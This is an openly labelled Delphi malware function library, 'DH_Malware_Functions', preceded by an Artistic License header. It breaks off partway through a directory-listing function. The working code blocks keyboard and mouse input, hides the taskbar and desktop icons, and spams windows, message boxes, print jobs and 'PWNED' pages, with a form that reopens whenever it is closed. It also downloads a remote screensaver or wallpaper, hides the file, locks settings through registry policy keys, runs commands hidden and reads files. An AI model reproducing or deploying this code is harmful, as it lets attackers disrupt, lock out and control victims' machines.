{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Unit : DH Malware Functions
// Version : 1.0
// (C) Doddy Hackman 2016

unit DH_Malware_Functions;

{$POINTERMATH ON}

interface

uses
  System.SysUtils, Vcl.Dialogs, Windows, TlHelp32, ShellApi, WinSvc, Registry,
  URLMon,
  Classes, Math, Vcl.Forms, Vcl.Imaging.jpeg, Vcl.StdCtrls, Vcl.Graphics,
  Vcl.Controls,
  ComObj, ActiveX, Variants, Messages, OtlThreadPool, OtlComm, OtlTask,
  OtlTaskControl;

type
  T_DH_Malware_Functions = class
  private

  public
    constructor Create;
    destructor Destroy; override;
    function read_file(filename: string): string;
    function crazy_mouse(count: integer): string;
    function crazy_hour(count: integer): string;
    function SendKeys(text: string): string;
    function speak(text: string): string;
    function execute_command(command: string): string;
    function write_word(text: string): string;
    function taskbar_manager(option: string): string;
    function icons_manager(option: string): string;
    function list_directory(directory: string): string;
    function delete_filename(filename: string): string;
    function list_process(): string;
    function kill_process(process_name: string): string;
    function cd_manager(option: string): string;
    function get_drives(): string;
    function get_services(): string;
    function list_windows(): string;
    function shutdown(): string;
    function close_session(): string;
    function reboot(): string;
    function turn_off_monitor(): string;
    function message_box(title, message_text, type_message: string): string;
    function load_page(page: string): string;
    function load_paint(): string;
    function edit_taskbar_text(option, text: string): string;
    function download_and_execute(link, new_name: string): string;
    function play_beep(count: integer): string;

    function download_and_change_screensaver(url: string): string;
    function unlock_sreensaver(): string;
    function start_screensaver(): string;

    function download_and_change_wallpaper(url: string): string;
    function unlock_wallpaper(): string;

    function printer_bomber(file_to_print: string; count: integer): string;
    function message_box_bomber(title, message_text, type_message: string;
      count: integer): string;
    function form_bomber(title, text, background, type_size: string;
      Width, Height: integer; count: integer): string;

    function html_bomber(title, content, background: string;
      count: integer): string;
    function block_all(option: string): string;
    function windows_bomber(count: integer): string;

  end;

implementation

var
  active_windows_founds: string;
  hilos_activos1: integer;

constructor T_DH_Malware_Functions.Create;
begin
  inherited Create;
  //
end;

destructor T_DH_Malware_Functions.Destroy;
begin
  inherited Destroy;
end;

// Functions auxiliars

function execute_command_loader(command: string; argument: string;
  option: string): string;
var
  loader: SHELLEXECUTEINFO;
begin
  if not(command = '') and not(argument = '') and not(option = '') then
  begin
    try
      begin

        ZeroMemory(@loader, SizeOf(SHELLEXECUTEINFO));
        loader.cbSize := SizeOf(SHELLEXECUTEINFO);
        loader.fMask := SEE_MASK_NOCLOSEPROCESS;
        loader.Wnd := 0;
        loader.lpVerb := Pchar(command);
        loader.lpFile := Pchar(argument);
        loader.lpParameters := '';

        if (option = 'show') then
        begin
          loader.nShow := SW_SHOWNORMAL;
        end;
        if (option = 'hide') then
        begin
          loader.nShow := SW_HIDE;
        end;
        if not ShellExecuteEx(@loader) then
        begin
          if GetLastError <= 32 then
          begin
            SysErrorMessage(GetLastError);
          end;
        end;
        Result := '[+] Command Execute : OK'
      end;
    except
      Result := '[-] Command Execute : ERROR'
    end;
  end
  else
  begin
    Result := '[-] Command Execute : ERROR'
  end;
end;

//

// Function to Windows Bomber

function T_DH_Malware_Functions.windows_bomber(count: integer): string;
var
  win_now: OleVariant;
  time: integer;
  i: integer;
begin

  time := 3000; // 3 seconds

  if (count > 0) then
  begin
    try
      begin
        for i := 1 to count do
        begin
          Sleep(time);
          win_now := CreateOleObject('Shell.Application');
          win_now.MinimizeAll;
          win_now := Unassigned;
          Sleep(time);
          win_now := CreateOleObject('Shell.Application');
          win_now.UndoMinimizeAll;
          win_now := Unassigned;
          Sleep(time);
        end;
        Result := '[+] Windows Bomber : OK';
      end;
    except
      begin
        Result := '[-] Windows Bomber : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Windows Bomber : ERROR';
  end;
end;

//

// Function to block keyword and mouse

function BlockInput(fBlockInput: Boolean): DWORD; stdcall;
  external 'user32.DLL' delayed;

function T_DH_Malware_Functions.block_all(option: string): string;
begin
  try
    begin
      if (option = 'on') then
      begin
        BlockInput(True);
      end
      else if (option = 'off') then
      begin
        BlockInput(False);
      end
      else
      begin
        BlockInput(True);
      end;
      Result := '[+] Block All : OK';
    end;
  except
    begin
      Result := '[-] Block All : ERROR';
    end;
  end;
end;

//

// Function to HTML Bomber

function savefile(archivo, texto: string): bool;
var
  open_file: TextFile;
begin
  try
    begin
      AssignFile(open_file, archivo);
      FileMode := fmOpenWrite;

      if FileExists(archivo) then
      begin
        Append(open_file);
      end
      else
      begin
        Rewrite(open_file);
      end;

      Write(open_file, texto);
      CloseFile(open_file);
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function T_DH_Malware_Functions.html_bomber(title, content, background: string;
  count: integer): string;
var
  title_now, content_now, type_background: string;
  path_html: string;
  path_image: string;
  html_ready: string;
  i: integer;
begin

  if (count > 0) then
  begin
    try
      begin

        path_html := GetEnvironmentVariable('TEMP') + '/fuckyou.html';
        path_image := GetEnvironmentVariable('TEMP') + '/fuckyou.jpg';

        if (FileExists(path_html)) then
        begin
          DeleteFile(Pchar(path_html));
        end;

        if (FileExists(path_image)) then
        begin
          DeleteFile(Pchar(path_image));
        end;

        if (title = '') then
        begin
          title_now := 'OWNED';
        end
        else
        begin
          title_now := title;
        end;

        if (content = '') then
        begin
          content_now := 'YOU ARE PWNED';
        end
        else
        begin
          content_now := content;
        end;

        if (FileExists(background)) then
        begin
          type_background :=
            'background:transparent url("fuckyou.jpg") repeat scroll 0 0;';
          CopyFile(Pchar(background), Pchar(path_image), False);
        end
        else
        begin
          type_background := 'background-color:black;';
        end;

        html_ready := '<html>' + sLineBreak + '<head>' + sLineBreak + '<title>'
          + title_now + '</title>' + sLineBreak + '</head>' + sLineBreak +
          '<body>' + sLineBreak + '<style>' + sLineBreak + 'body {' + sLineBreak
          + '    margin : 0;' + sLineBreak + type_background + sLineBreak +
          '	color:red;' + sLineBreak + '	font-size:50px;' + sLineBreak +
          '	font-family:helvetica,arial,sans-serif;' + sLineBreak + '}' +
          sLineBreak + '' + sLineBreak + '.container1 {' + sLineBreak +
          '    position : absolute;' + sLineBreak + '    display: table;' +
          sLineBreak + '    width: 100%;' + sLineBreak + '    height: 100%;' +
          sLineBreak + '}' + sLineBreak + '' + sLineBreak + '.container2 {' +
          sLineBreak + '    display: table-cell;' + sLineBreak +
          '    vertical-align: middle;' + sLineBreak + '    text-align: center;'
          + sLineBreak + '}' + sLineBreak + '' + sLineBreak + '.center {' +
          sLineBreak + '    display: inline-block;' + sLineBreak +
          '    padding : 20px;' + sLineBreak + '' + sLineBreak + '}' +
          sLineBreak + '</style>' + sLineBreak + '' + sLineBreak +
          '<div class="container1">' + sLineBreak +
          '   <div class="container2">' + sLineBreak +
          '     <div class="center">' + sLineBreak + '        <h1>' +
          content_now + '</h1>' + sLineBreak + '     </div>' + sLineBreak +
          '   </div>' + sLineBreak + '</div>' + sLineBreak + '</body>' +
          sLineBreak + '</html>' + sLineBreak;

        savefile(path_html, html_ready);

        for i := 1 to count do
        begin
          ShellExecute(0, nil, Pchar(path_html), nil, nil, SW_SHOWNORMAL);
        end;

        Result := '[+] HTML Bomber : OK';

      end;
    except
      Result := '[-] HTML Bomber : ERROR';
    end;
  end
  else
  begin
    Result := '[-] HTML Bomber : ERROR';
  end;

end;

//

// Function to Form Bomber

var
  form_clone: TForm;
  title_save, text_save, background_save: string;
  type_size_save: string;
  width_save, Height_save: integer;

type
  thread_form_bomber = class
    class procedure FormClose(Sender: TObject; var Action: TCloseAction);
  end;

procedure make_form(title, text, background, type_size: string;
  Width, Height: integer);
var
  width_final: integer;
  height_final: integer;
var
  bmp: TBitmap;
  jpg: TJpegImage;
var
  label_yeah: TLabel;
const
  dimensiones: array [1 .. 20] of string = ('10', '25', '50', '100', '150',
    '200', '250', '300', '350', '400', '450', '500', '550', '600', '650', '700',
    '750', '800', '850', '900');
var
  x, y: integer;
begin

  try
    begin
      width_final := 0;
      height_final := 0;

      form_clone := TForm.Create(nil);
      form_clone.BorderStyle := bsDialog;
      form_clone.Position := poDesigned;

      jpg := TJpegImage.Create;
      bmp := TBitmap.Create;

      x := StrToInt(dimensiones[RandomRange(1, 20)]);
      y := StrToInt(dimensiones[RandomRange(1, 20)]);

      if not(FileExists(background)) and not(Width > 0) and not(Height > 0) then
      begin
        Width := 500;
        Height := 300;
      end;

      if FileExists(background) and (ExtractFileExt(background) = '.jpg') then
      begin
        if (type_size = 'image_full') then
        begin

          jpg.LoadFromFile(background);
          bmp.Assign(jpg);
          form_clone.Brush.Bitmap := bmp;

          Width := jpg.Width;
          Height := jpg.Height;

        end
        else
        begin

          jpg.LoadFromFile(background);
          bmp.Assign(jpg);
          form_clone.Brush.Bitmap := bmp;

          if not(Width > 0) and not(Height > 0) then
          begin
            Width := 500;
            Height := 300;
          end;

        end;
      end
      else
      begin
        // background black
        form_clone.Color := clBlack;
      end;

      if (title = '') then
      begin
        title := 'You are PWNED';
      end;

      if (text = '') then
      begin
        text := 'PWNED PWNED PWNED';
      end;

      label_yeah := TLabel.Create(form_clone);

      title_save := title;
      text_save := text;
      background_save := background;
      type_size_save := type_size;

      width_final := Width;
      height_final := Height;

      width_save := width_final;
      Height_save := height_final;

      form_clone.Caption := title;
      form_clone.Width := width_final;
      form_clone.Height := height_final;

      label_yeah.Align := alClient;
      label_yeah.Alignment := taCenter;
      label_yeah.Layout := tlCenter;
      label_yeah.Parent := form_clone;
      label_yeah.Caption := text;
      label_yeah.Font.Color := clRed;
      label_yeah.Font.Size := 27;
      label_yeah.AutoSize := False;
      label_yeah.Transparent := True;

      label_yeah.Left := (form_clone.Width - label_yeah.Width) div 2;

      label_yeah.Top := (form_clone.Height - label_yeah.Height) div 2;

      label_yeah.Show;
      label_yeah.Update;

      form_clone.OnClose := thread_form_bomber.FormClose;

      form_clone.Left := x;
      form_clone.Top := y;

      form_clone.Show;
      form_clone.Update;
    end;
  except
    //
  end

end;

class procedure thread_form_bomber.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  make_form(title_save, text_save, background_save, type_size_save, width_save,
    Height_save);
  Abort;
end;

function T_DH_Malware_Functions.form_bomber(title, text, background,
  type_size: string; Width, Height: integer; count: integer): string;
var
  i: integer;
begin
  if (count > 0) then
  begin
    for i := 1 to count do
    begin
      make_form(title, text, background, type_size, Width, Height);
    end;

    Result := '[+] Form Bomber : OK';
  end
  else
  begin
    Result := '[-] Form Bomber : ERROR';
  end;

end;

//

// Function message_bomber

function T_DH_Malware_Functions.message_box_bomber(title, message_text,
  type_message: string; count: integer): string;
var
  i, x, y: integer;
const
  dimensiones: array [1 .. 20] of string = ('10', '25', '50', '100', '150',
    '200', '250', '300', '350', '400', '450', '500', '550', '600', '650', '700',
    '750', '800', '850', '900');
begin
  if not(title = '') and not(message_text = '') and (count > 0) then
  begin
    try
      begin
        For i := 1 to count do
        begin
          x := StrToInt(dimensiones[RandomRange(1, 20)]);
          y := StrToInt(dimensiones[RandomRange(1, 20)]);
          if (type_message = 'Information') then
          begin
            MessageDlgPos(message_text, mtInformation, [mbOk], 0, x, y);
          end
          else if (type_message = 'Question') then
          begin
            MessageDlgPos(message_text, mtConfirmation, [mbOk], 0, x, y);
          end
          else if (type_message = 'Warning') then
          begin
            MessageDlgPos(message_text, mtWarning, [mbOk], 0, x, y);
          end
          else if (type_message = 'Error') then
          begin
            MessageDlgPos(message_text, mtError, [mbOk], 0, x, y);
          end
          else
          begin
            MessageDlgPos(message_text, mtInformation, [mbOk], 0, x, y);
          end;
        end;
      end;
      Result := '[+] MessageBox Bomber : OK';
    except
      begin
        Result := '[-] MessageBox Bomber : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] MessageBox Bomber : ERROR';
  end;
end;

// Function printer_bomber

function T_DH_Malware_Functions.printer_bomber(file_to_print: string;
  count: integer): string;
var
  i: integer;
begin
  if (FileExists(file_to_print)) and (count > 0) then
  begin
    try
      begin
        For i := 1 to count do
        begin
          execute_command_loader('print', file_to_print, 'hide');
        end;
      end;
      Result := '[+] Printer Bomber : OK';
    except
      begin
        Result := '[-] Printer Bomber : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Printer Bomber : ERROR';
  end;
end;

//

function lock_screensaver(): string;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey
        ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
      Registry.WriteString('NoDispScrSavPage', '1');
      Registry.Free;
      Result := '[+] Lock Screensaver : OK';
    end;
  except
    begin
      Result := '[-] Lock Screensaver : ERROR';
    end;
  end;
end;

function change_screensaver(screensaver: string): Boolean;
var
  Registry: TRegistry;
  response: Boolean;
begin
  response := False;
  if (FileExists(screensaver)) then
  begin
    try
      begin
        Registry := TRegistry.Create;
        Registry.RootKey := HKEY_CURRENT_USER;
        Registry.OpenKey('Control Panel\Desktop', True);
        Registry.WriteString('SCRNSAVE.EXE', screensaver);
        Registry.WriteString('ScreenSaverIsSecure', '1');
        Registry.Free;

        SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, 1, nil,
          SPIF_SENDWININICHANGE);
        SystemParametersInfo(SPI_SETSCREENSAVETIMEOUT, 60 * 30, nil,
          SPIF_SENDWININICHANGE);

        lock_screensaver();

        response := True;
      end
    except
      begin
        response := False;
      end;
    end;
  end
  else
  begin
    Result := False;
  end;
  Result := response;
end;

function T_DH_Malware_Functions.download_and_change_screensaver
  (url: string): string;
var
  filename: string;
begin
  if not(url = '') then
  begin
    try
      begin
        filename := GetCurrentDir + '\' + 'screensaver.scr';
        if (FileExists(filename)) then
        begin
          DeleteFile(Pchar(filename));
        end;
        UrlDownloadToFile(nil, Pchar(url), Pchar(filename), 0, nil);
        if (FileExists(filename)) then
        begin
          SetFileAttributes(Pchar(filename), FILE_ATTRIBUTE_HIDDEN);
          if (change_screensaver(filename)) then
          begin
            start_screensaver();
            Result := '[+] Change Screensaver : OK';
          end
          else
          begin
            Result := '[-] Change Screensaver : ERROR';
          end;
        end;
      end;
    except
      begin
        Result := '[-] Change Screensaver : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Change Screensaver : ERROR';
  end;
end;

function clean_screensaver(): Boolean;
var
  Registry: TRegistry;
  response: Boolean;
begin
  response := False;
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey('Control Panel\Desktop', True);
      Registry.WriteString('SCRNSAVE.EXE', '');
      Registry.WriteString('ScreenSaverIsSecure', '1');
      Registry.Free;
      response := True;
    end;
  except
    begin
      response := False;
    end;
  end;
  Result := response;
end;

function T_DH_Malware_Functions.unlock_sreensaver(): string;
var
  Registry: TRegistry;
begin
  try
    begin
      if (clean_screensaver()) then
      begin
        Registry := TRegistry.Create;
        Registry.RootKey := HKEY_CURRENT_USER;
        Registry.OpenKey
          ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
        Registry.DeleteValue('NoDispScrSavPage');
        Registry.Free;
        Result := '[+] Unlock Screensaver : OK';
      end
      else
      begin
        Result := '[-] Unlock Screensaver : ERROR';
      end;
    end;
  except
    begin
      Result := '[-] Unlock Screensaver : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.start_screensaver(): string;
const
  WM_SYSCOMMAND = $0112;
begin
  try
    begin
      PostMessage(GetDesktopWindow, WM_SYSCOMMAND, SC_SCREENSAVE, 0);
      Result := '[+] Start Screensaver : OK';
    end;
  except
    begin
      Result := '[-] Start Screensaver : ERROR';
    end;
  end;
end;

// Functions to change wallpaper

function lock_wallpaper(wallpaper: string): Boolean;
var
  Registry: TRegistry;
  response: Boolean;
begin
  response := False;
  if (FileExists(wallpaper)) then
  begin
    try
      begin
        Registry := TRegistry.Create;
        Registry.RootKey := HKEY_CURRENT_USER;
        Registry.OpenKey
          ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
        Registry.WriteString('Wallpaper', wallpaper);
        Registry.Free;
        response := True;
      end;
    except
      begin
        response := False;
      end;
    end;
  end
  else
  begin
    response := False;
  end;
  Result := response;
end;

function change_wallpaper(wallpaper: string): Boolean;
var
  response: Boolean;
begin
  response := False;
  if (FileExists(wallpaper)) then
  begin
    try
      begin
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, Pointer(wallpaper),
          SPIF_SENDWININICHANGE);
        if (lock_wallpaper(wallpaper)) then
        begin
          response := True;
        end
        else
        begin
          response := False;
        end;
      end;
    except
      begin
        response := False;
      end;
    end;
  end
  else
  begin
    response := False;
  end;
  Result := response;
end;

function T_DH_Malware_Functions.download_and_change_wallpaper
  (url: string): string;
var
  filename: string;
begin
  if not(url = '') then
  begin
    try
      begin
        filename := GetCurrentDir + '\' + 'wallpaper.jpg';
        if (FileExists(filename)) then
        begin
          DeleteFile(Pchar(filename));
        end;
        UrlDownloadToFile(nil, Pchar(url), Pchar(filename), 0, nil);
        if (FileExists(filename)) then
        begin
          SetFileAttributes(Pchar(filename), FILE_ATTRIBUTE_HIDDEN);
          if (change_wallpaper(filename)) then
          begin
            Result := '[+] Change Wallpaper : OK';
          end
          else
          begin
            Result := '[-] Change Wallpaper : ERROR';
          end;
        end;
      end;
    except
      begin
        Result := '[-] Change Wallpaper : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Change Wallpaper : ERROR';
  end;
end;

function T_DH_Malware_Functions.unlock_wallpaper(): string;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey
        ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
      Registry.DeleteValue('Wallpaper');
      Registry.Free;
      Result := '[+] Unlock Wallpaper : OK';
    end;
  except
    begin
      Result := '[-] Unlock Wallpaper : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.read_file(filename: string): string;
const
  limit = $8000;

var
  file1: LongWord;
  file2: THandle;
  output: array [0 .. limit - 1] of AnsiChar;
  status: string;
  code: string;

begin
  if not(filename = '') then
  begin
    try
      begin
        output := '';
        status := '[+] File open : OK' + sLineBreak + sLineBreak;
        code := '';

        if (FileExists(filename)) then
        begin
          file2 := CreateFile(Pchar(filename), GENERIC_READ, FILE_SHARE_READ or
            FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, 0);

          SetFilePointer(file2, 0, nil, FILE_BEGIN);

          ReadFile(file2, output, limit, file1, nil);

          while (file1 > 0) do
          begin
            ReadFile(file2, output, limit, file1, nil);
          end;
          CloseHandle(file2);

          if (output = '') and FileExists(filename) then
          begin
            code := status + '[-] Read File : Empty file';
          end
          else
          begin
            code := status + output;
          end;
        end
        else
        begin
          code := '[-] Read File : File not exists';
        end;
        Result := code;
      end;
    except
      begin
        Result := '[-] Read File : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Read File : ERROR';
  end;
end;

function T_DH_Malware_Functions.crazy_mouse(count: integer): string;
var
  i: integer;
  x: integer;
  y: integer;
  code: string;
begin
  if (count > 0) then
  begin
    try
      begin
        code := '';
        x := 0;
        y := 0;
        For i := 1 to count do
        begin
          Sleep(1000);
          x := RandomRange(1, 2000);
          y := RandomRange(1, 1000);
          SetCursorPos(x, y);
        end;
        code := '[+] Crazy Mouse : OK';
        Result := code;
      end;
    except
      begin
        Result := '[-] Crazy Mouse : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Crazy Mouse : ERROR';
  end;
end;

function T_DH_Malware_Functions.SendKeys(text: string): string;
// Thanks to Remy Lebeau for the help
var
  keyboard: PInput;
  check1, check2: integer;
  code: string;
begin
  if not(text = '') then
  begin
    try
      begin
        code := '';
        code := '[+] SendKeys : OK';

        GetMem(keyboard, SizeOf(TInput) * (Length(text) * 2));

        check2 := 0;

        for check1 := 1 to Length(text) do
        begin

          keyboard[check2].Itype := INPUT_KEYBOARD;
          keyboard[check2].ki.wVk := 0;
          keyboard[check2].ki.wScan := ord(text[check1]);
          keyboard[check2].ki.dwFlags := KEYEVENTF_UNICODE;
          keyboard[check2].ki.time := 0;
          keyboard[check2].ki.dwExtraInfo := 0;

          Inc(check2);

          keyboard[check2].Itype := INPUT_KEYBOARD;
          keyboard[check2].ki.wVk := 0;
          keyboard[check2].ki.wScan := ord(text[check1]);
          keyboard[check2].ki.dwFlags := KEYEVENTF_UNICODE or KEYEVENTF_KEYUP;
          keyboard[check2].ki.time := 0;
          keyboard[check2].ki.dwExtraInfo := 0;

          Inc(check2);

        end;

        SendInput(check2, keyboard[0], SizeOf(TInput));

        Result := code;
      end;
    except
      begin
        Result := '[-] SendKeys : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] SendKeys : ERROR';
  end;
end;

function T_DH_Malware_Functions.write_word(text: string): string;
var
  code: string;
begin
  if not(text = '') then
  begin
    try
      begin
        code := '';
        code := '[+] Word Joke : OK';
        ShellExecute(0, nil, Pchar('winword.exe'), nil, nil, SW_SHOWNORMAL);
        Sleep(7000);
        SendKeys(text);
        Result := code;
      end;
    except
      begin
        Result := '[-] Word Joke : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Word Joke : ERROR';
  end;
end;

function T_DH_Malware_Functions.taskbar_manager(option: string): string;
var
  code: string;
begin
  if not(option = '') then
  begin
    try
      begin
        code := '';
        if (option = 'show') then
        begin
          ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
          code := '[+] Show Taskbar : OK';
        end
        else if (option = 'hide') then
        begin
          ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
          code := '[+] Hide Taskbar : OK';
        end
        else
        begin
          code := '[-] Taskbar Manager : Bad option';
        end;

        Result := code;
      end;
    except
      begin
        Result := '[-] Taskbar Manager : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Taskbar Manager : ERROR';
  end;
end;

function T_DH_Malware_Functions.icons_manager(option: string): string;
var
  code: string;
  window: THandle;
begin
  if not(option = '') then
  begin
    try
      begin
        code := '';
        window := FindWindow('ProgMan', nil);
        window := GetWindow(window, GW_CHILD);

        if (option = 'show') then
        begin
          ShowWindow(window, SW_SHOW);
          code := '[+] Show Icons : OK';
        end
        else if (option = 'hide') then
        begin
          ShowWindow(window, SW_HIDE);
          code := '[+] Hidden Icons : OK';
        end
        else
        begin
          code := '[-] Icons Manager : Bad option';
        end;

        Result := code;
      end;
    except
      begin
        Result := '[-] Icons Manager : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Icons Manager : ERROR';
  end;
end;

function T_DH_Malware_Functions.list_directory(directory: string): string;
var

  search: TSearchRec;
  directory_result: string;
  filename_result: string;
  directory_count: integer;
  filename_count: integer;
  code: string;

begin
  if not(directory = '') then
  begin
    try
      begin
        directory_result := '';
        filename_result := '';
        directory_count := 0;
        filename_count := 0;
        code := '';

        if (DirectoryExists(directory)) then
        begin

          FindFirst(directory + '\*.*', faAnyFile + faDirectory +
            faReadOnly, search);

          if (search.Attr = faDirectory) then
          begin
            if not(search.Name = '.') then
            begin
              if not(search.Name = '..') then
              begin
                directory_result := directory_result + '[Directory] : ' +
                  search.Name + sLineBreak;
                Inc(directory_count);
              end;
            end;
          end
          else
          begin
            filename_result := filename_result + '[Filename] : ' + search.Name +
              sLineBreak;
            Inc(filename_count);
          end;

          while FindNext(search) = 0 do
          begin
            if (search.Attr = faDirectory) then
            begin
              if not(search.Name = '.') then
              begin
                if not(search.Name = '..') then
                begin
                  directory_result := directory_result + '[Directory] : ' +
                    search.Name + sLineBreak;
                  Inc(directory_count);
                end;
              end;
            end
            else
            begin
              filename_result := filename_result + '[Filename] : ' + search.Name
                + sLineBreak;
              Inc(filename_count);
            end;
          end;

          code := '[+] Load directory : OK' + sLineBreak + sLineBreak;
          code := code + '[+] Directory founds : ' + IntToStr(directory_count) +
            sLineBreak;
          code := code + '[+] Filenames founds : ' + IntToStr(filename_count) +
            sLineBreak;

          if not(directory_result = '') then
          begin
            code := code + sLineBreak + directory_result;
          end;

          if not(filename_result = '') then
          begin
            code := code + sLineBreak + filename_result;
          end;

          code := code + sLineBreak + '[+] Finished';

          if (code = '') then
          begin
            code := '[-] List directory : Directory empty';
          end;
        end
        else
        begin
          code := '[-] List directory : Directory not exists';
        end;
        Result := code;
      end;
    except
      begin
